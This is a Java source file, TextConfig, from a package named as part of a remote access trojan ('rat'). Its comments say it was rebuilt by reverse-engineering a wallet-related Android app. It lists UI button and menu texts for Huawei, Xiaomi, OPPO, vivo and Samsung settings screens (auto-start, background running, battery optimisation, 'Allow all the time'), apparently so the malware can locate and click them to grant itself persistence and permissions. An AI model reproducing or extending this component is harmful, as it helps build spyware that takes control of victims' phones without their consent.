package com.vendor.rat.config;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * UI 文本配置 (配置驱动)
 *
 * 基于逆向分析: com.guard.wallet.utils.f.b("KEY") 从配置读取 UI 文本
 * Vendor APK 使用 b.v("KEY", ...) 方法从 config.json 加载多语言文本
 *
 * 每个 key 对应多个候选文本，按顺序尝试匹配
 * 支持从 config.json 覆盖默认值
 */
public class TextConfig {

    private static volatile TextConfig instance;
    private final Map<String, List<String>> textMap = new HashMap<>();

    private TextConfig() {
        initDefaults();
    }

    public static TextConfig getInstance() {
        if (instance == null) {
            synchronized (TextConfig.class) {
                if (instance == null) {
                    instance = new TextConfig();
                }
            }
        }
        return instance;
    }

    /**
     * 获取配置文本列表
     */
    public List<String> getTexts(String key) {
        return textMap.get(key);
    }

    /**
     * 获取第一个配置文本
     */
    public String getFirst(String key) {
        List<String> texts = textMap.get(key);
        return texts != null && !texts.isEmpty() ? texts.get(0) : null;
    }

    /**
     * 覆盖配置 (从 config.json 加载后调用)
     */
    public void put(String key, List<String> texts) {
        textMap.put(key, texts);
    }

    /**
     * 覆盖配置 (单个文本)
     */
    public void put(String key, String... texts) {
        textMap.put(key, Arrays.asList(texts));
    }

    // ============ 默认配置 ============

    private void initDefaults() {
        // ====== 华为/荣耀 ======
        textMap.put("HUA_WEI_ALLOW_AUTO_STARTUP_TEXT",
            Arrays.asList("允许自启动", "自动启动", "自启动"));
        textMap.put("HUA_WEI_ALLOW_IN_BACKGROUND_TEXT",
            Arrays.asList("允许后台活动", "后台运行", "后台活动"));
        textMap.put("HUA_WEI_ALLOW_RELATE_STARTUP_TEXT",
            Arrays.asList("允许关联启动", "关联启动"));
        textMap.put("HUA_WEI_APP_AND_NOTIFICATION_TEXT",
            Arrays.asList("应用和通知", "应用管理", "应用和服务"));
        textMap.put("HUA_WEI_AUTO_MANAGE_TEXT",
            Arrays.asList("自动管理", "自动"));
        textMap.put("HUA_WEI_MANUAL_MANAGE_TEXT",
            Arrays.asList("手动管理", "手动"));

        // ====== 小米/红米 ======
        textMap.put("MIUI_APP_POWER_CONSUME_TEXT",
            Arrays.asList("电量消耗", "耗电排行", "电量使用"));
        textMap.put("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT",
            Arrays.asList("省电策略", "耗电策略", "电池策略"));
        textMap.put("MIUI_AUTO_START_TEXT",
            Arrays.asList("自启动", "自启动管理"));
        textMap.put("MIUI_NO_RESTRICTION_TEXT",
            Arrays.asList("无限制", "不限制", "无后台限制"));
        textMap.put("MIUI_HIDDEN_APPS_TEXT",
            Arrays.asList("后台应用管理", "隐藏应用"));

        // ====== OPPO/realme/一加 ======
        textMap.put("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT",
            Arrays.asList("允许后台运行", "后台冻结", "允许后台活动"));
        textMap.put("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT",
            Arrays.asList("允许自启动", "自启动"));
        textMap.put("COLORS_SETTINGS_ALLOW_BUTTON_TEXT",
            Arrays.asList("允许", "确定"));
        textMap.put("COLORS_SETTINGS_POWER_MANAGE_TEXT",
            Arrays.asList("电源管理", "电池优化", "耗电保护"));

        // ====== vivo/iQOO ======
        textMap.put("VIVO_ALLOW_BACKGROUND_HIGH_POWER_TEXT",
            Arrays.asList("允许后台高耗电", "允许后台运行", "不限制"));
        textMap.put("VIVO_BACKGROUND_POWER_MANAGE_TEXT",
            Arrays.asList("后台耗电管理", "电池优化", "耗电保护"));

        // ====== 三星 ======
        textMap.put("SAMSUNG_BACKGROUND_LIMIT_TEXT",
            Arrays.asList("后台使用限制", "后台限制", "应用睡眠", "App power management"));
        textMap.put("SAMSUNG_UNRESTRICTED_TEXT",
            Arrays.asList("不受限应用", "从不睡眠", "永不睡眠", "Unrestricted apps"));
        textMap.put("SAMSUNG_NOT_OPTIMIZE_TEXT",
            Arrays.asList("不优化", "Don't optimize", "无限制"));

        // ====== 通用 ======
        textMap.put("COMMON_ALLOW_TEXT",
            Arrays.asList("允许", "Allow", "同意"));
        textMap.put("COMMON_CONFIRM_TEXT",
            Arrays.asList("确定", "确认", "OK", "Done"));
        textMap.put("COMMON_CANCEL_TEXT",
            Arrays.asList("取消", "Cancel"));
        textMap.put("COMMON_CONTINUE_TEXT",
            Arrays.asList("继续", "Continue"));
        textMap.put("COMMON_ACTIVATE_TEXT",
            Arrays.asList("激活", "启用", "Activate", "Active"));
        textMap.put("COMMON_ALLOW_ALWAYS_TEXT",
            Arrays.asList("始终允许", "Allow all the time"));
        textMap.put("COMMON_ALLOW_WHILE_USING_TEXT",
            Arrays.asList("仅在使用中允许", "仅在使用该应用时允许",
                "While using the app", "Allow only while using the app"));
    }
}
